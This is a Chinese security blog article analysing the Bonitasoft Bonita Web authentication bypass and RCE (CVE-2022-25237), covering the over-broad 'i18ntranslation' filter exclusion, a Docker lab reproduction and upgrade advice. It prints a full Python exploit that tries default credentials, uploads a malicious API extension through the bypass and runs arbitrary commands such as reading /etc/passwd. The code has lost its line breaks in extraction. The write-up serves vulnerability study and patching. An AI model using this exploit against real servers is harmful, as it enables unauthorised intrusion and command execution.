#  Bonitasoft 认证绕过及RCE漏洞分析及复现  
 蚁景网安   2026-04-29 09:08  
  
## 前言  
  
由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。  
## 一、漏洞原理  
### 漏洞简述  
  
Bonitasoft 是一个业务自动化平台，可以更轻松地在业务流程中构建、部署和管理自动化应用程序；  
  
Bonita 是一个用于业务流程自动化和优化的开源和可扩展平台。  
  
Bonita Web 2021.2版本受到认证绕过影响，因为其API认证过滤器的过滤模式过于宽泛。  
  
通过添加恶意构造的字符串到API URL，普通用户可以访问需特权的API端点。这可能导致特权API操作将恶意代码添加至服务器，从而造成RCE攻击。  
### 漏洞影响范围  
  
**供应商**  
：Bonitasoft  
  
**产品**  
：Bonita Platform  
  
**确认受影响版本**  
：< 2022.1-u0  
  
**修复版本**  
：/  
  
**社区版**  
：< 2022.1-u0 (7.14.0)  
  
**订购版**  
：< 2022.1-u0 (7.14.0) 、2021.2-u4 (7.13.4) 、2021.1-0307 (7.12.11) 、7.11.7  
### 漏洞分析  
  
本漏洞的漏洞点来自系统中web.xml文件，该文件用于定义系统应用的路由和如何处理路由的认证及授权。以社区版2021.2 u0为例，XML配置文件路径为bonita\BonitaCommunity-2021.2-u0\server\webapps\bonita\WEB-INF\web.xml。  
  
按照经验来说，这里会是认证绕过易产生之处。确切地说，web.xml中的过滤器很有效地决定了访问特定路由是否应该进行过滤。下图认证过滤器定义赋值参数excludePatterns，值为i18ntranslation。之后将参数传递给2个不同过滤器类：RestAPIAuthorizationFilter, TokenValidatorFilter。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfX4GibAkHGQcOlm7nVLibO6UvgrhibkficlicCGZ7LwUjMXWsOaI9ibegaKpfE8exHJI3fr7wfOVKFic1xA/640?wx_fmt=png "null")  
  
xml 定义param并传递  
  
同时上述2个类RestAPIAuthorizationFilter, TokenValidatorFilter，存在同一父类AbstractAuthorizationFilter。  
  
分析这些过滤器都对AbstractAuthorizationFilter进行扩展处理，其中doFilter方法我们展开说明。  
  
路径为org.bonitasoft.console.common.server.login.filter.AbstractAuthorizationFilter#doFilter。  
  
通过sessionIsNotNeeded方法进行检查，如果返回结果为真，则继续代码流程。  
  
（checkValidCondition方法主要对doFilter的两个参数httpRequest、httpResponse进行检查，可能用于同源策略检查，不详细叙述）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfX4GibAkHGQcOlm7nVLibO6UrfibnjRe9S11yjHAmdiakrloAKNU3TnQYO0zjJAELgVyOicAiaNkPVx7pA/640?wx_fmt=png "null")  
  
doFilter方法  
  
下图可以看到该方法主要是参照excludePatterns对请求 URL路径字段进行检查。如果该路径存在该模式，会绕过认证过滤器，从而成功访问资源。  
  
开始定义状态值isMatched，默认值为false。开始进行空值检查，对excludePatterns进行分隔处理。  
  
循环进行检查，如果requestURL包含excludePatterns，则状态值isMatched变为true。跳出循环。  
  
![](https://mmbiz.qpic.cn/mmbiz/3RhuVysG9LfX4GibAkHGQcOlm7nVLibO6Ucx6Fic25BWGndg8FLAZLadNkcbbIwevJCfDthE0Gk0NWz2iaI9cicyTkg/640?wx_fmt=other "null")  
  
sessionIsNotNeed方法  
  
在前面XML文件中参数excludePattern的值为i18ntranslation。这意味着URL路径如果包含i18ntranslation，则会允许认证绕过。  
  
根据代码特征测试，“/i18ntranslation/../“ 或 ”;i18ntranslation“ 可以进行绕过。  
  
另外，远程命令执行（RCE）该漏洞主要是以上传恶意文件作为方式，上传接口同样定义在web.xml，为/API/pageUpload。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfX4GibAkHGQcOlm7nVLibO6U9l0yaCKqSu4NbpaHpE6K2ZIIEeYSP2icS4EMW1BQciayKllvf07QV91A/640?wx_fmt=png "null")  
  
API上传接口  
  
getPagePermissions方法在文件处理过程需要session，该session就是从apiSession获取。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfX4GibAkHGQcOlm7nVLibO6UZHjzW7pXIURiaKB3KvD99NcOTj7riczXyeQDpXdZ71BrZibfEcVxbUYpw/640?wx_fmt=png "null")  
  
getPagePermissions方法  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfX4GibAkHGQcOlm7nVLibO6UiaShfdZCvv9txbF51iaShebtGhtgpudncQicJzibLPu3lRxIYE1GxtluxA/640?wx_fmt=png "null")  
  
获取APIsession  
  
根据代码，若未登录状况，apisession无法赋值，该方法会抛出异常。  
  
从攻击角度，我们需要通过非特权下普通用户进行会话，使得apisession正常赋值，进一步实现远程命令执行。  
## 二、漏洞复现实战  
### 环境搭建  
1. 1. docker镜像：  
  
bonita - Official Image | Docker Hub  
1. 1. vulfocus：  
  
bonita镜像  
### 漏洞复现  
  
首先以超级管理员身份进入bonita，创建用户功能  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfX4GibAkHGQcOlm7nVLibO6UYHEQzpzMnew3ciaKpj19xqBdhYcfKGkTJ4b8UtwiaUnrqOOZe8d51ndQ/640?wx_fmt=png "null")  
  
bonita 首页  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfX4GibAkHGQcOlm7nVLibO6U5ZUjTicx3vqxAHZPgnxDtsPxlJmb5uWQ7vBkbt5bkicmx9MNAnhdco1w/640?wx_fmt=png "null")  
  
User功能  
  
创建普通用户  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfX4GibAkHGQcOlm7nVLibO6UV7mj4zxohjhVAFOpoZTNyQ9cbianf0YAVvAIp6qibUKVhERAEDrussWA/640?wx_fmt=png "null")  
  
添加用户  
  
之后根据POC进行复现  
  
POC：  
```
import requestsimport sysclassexploit:    try:        session = requests.session()        bonita_user = sys.argv[1]        bonita_password = sys.argv[2]        target_path = sys.argv[3]        cmd = sys.argv[4]        tempPath = ""        extension_id = ""        bonita_default_user = "install"        bonita_default_password = "install"        platform_default_user = "platformAdmin"        platform_default_password = "platform"    except:        print(f"Usage: python3 {sys.argv[0]} <username> <password> http://localhost:8080/bonita 'cat /etc/passwd'")        exit()deftry_default_logins():    req_url = f"{exploit.target_path}/loginservice"    req_cookies = {"x": "x"}    req_headers = {"Content-Type": "application/x-www-form-urlencoded"}    req_data = {"username": exploit.bonita_default_user, "password": exploit.bonita_default_password, "_l": "en"}    r = exploit.session.post(req_url, headers=req_headers, cookies=req_cookies, data=req_data)    if r.status_code == 401:        returnFalse        # This does not seem to work when authenticating as platformAdmin, maybe it can though.    #     req_url = f"{exploit.target_path}/platformloginservice"    #     req_cookies = {"x": "x"}    #     req_headers = {"Content-Type": "application/x-www-form-urlencoded"}    #     req_data = {"username": exploit.platform_default_user, "password": exploit.platform_default_password, "_l": "en"}    #     r = exploit.session.post(req_url, headers=req_headers, cookies=req_cookies, data=req_data)    #     if r.status_code == 200:    #         print(f"[+] Found default creds: {exploit.platform_default_user}:{exploit.platform_default_password}")    #         return True    else:        print(f"[+] Found default creds: {exploit.bonita_default_user}:{exploit.bonita_default_password}")        returnTruedeflogin():    req_url = f"{exploit.target_path}/loginservice"    req_cookies = {"x": "x"}    req_headers = {"Content-Type": "application/x-www-form-urlencoded"}    req_data = {"username": exploit.bonita_user, "password": exploit.bonita_password, "_l": "en"}    r = exploit.session.post(req_url, headers=req_headers, cookies=req_cookies, data=req_data)    if r.status_code == 401:        print("[!] Could not get a valid session using those credentials.")        exit()    else:        print(f"[+] Authenticated with {exploit.bonita_user}:{exploit.bonita_password}")defupload_api_extension():    req_url = f"{exploit.target_path}/API/pageUpload;i18ntranslation?action=add"    files=[    ("file",("rce_api_extension.zip",open("rce_api_extension.zip",'rb'),'application/octet-stream'))    ]    r = exploit.session.post(req_url, files=files)    exploit.tempPath = r.json()["tempPath"]defactivate_api_extension():    req_url = f"{exploit.target_path}/API/portal/page/;i18ntranslation"    req_headers = {"Content-Type": "application/json;charset=UTF-8"}    req_json={"contentName": "rce_api_extension.zip", "pageZip": exploit.tempPath}    r = exploit.session.post(req_url, headers=req_headers, json=req_json)    exploit.extension_id = r.json()["id"]defdelete_api_extension():    req_url = f"{exploit.target_path}/API/portal/page/{exploit.extension_id};i18ntranslation"    exploit.session.delete(req_url)defrun_cmd():    req_url = f"{exploit.target_path}/API/extension/rce?p=0&c=1&cmd={exploit.cmd}"    r = exploit.session.get(req_url)    print(r.json()["out"])ifnot try_default_logins():    print("[!] Did not find default creds, trying supplied credentials.")    login()upload_api_extension()activate_api_extension()try:    run_cmd()except:    delete_api_extension()delete_api_extension()
```  
  
执行POC  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfX4GibAkHGQcOlm7nVLibO6UbH3PeibckD0mMWuFbD3XKtyFP51VqKkQDvy2xaKZHfLiaiayZLprGXHAA/640?wx_fmt=png "null")  
  
POC执行  
### 漏洞修复  
  
建议更新至2022.1-u0以上版本  
## 结束语  
  
本文主要介绍了CVE-2022-25237 Bonitasoft 认证绕过和RCE漏洞的原理分析及复现过程，漏洞主要利用构造恶意字段添加至API URL，绕过过滤器进行访问资源，从而造成认证绕过，进一步可远程命令执行。  
  
根据漏洞原理可以参照的是，在安全控制方面，左移安全中安全开发过程及时开展代码审计等测试工作，避免上述漏洞涉及的问题。  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6iavic0tIJIoZCwKvUYnFFiaibgSm6mrFp1ZjAg4ITRicicuLN88YodIuqtF4DcUs9sruBa0bFLtX59lQQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
学  
习  
网安实战技术  
，戳  
“阅读原文”  
  
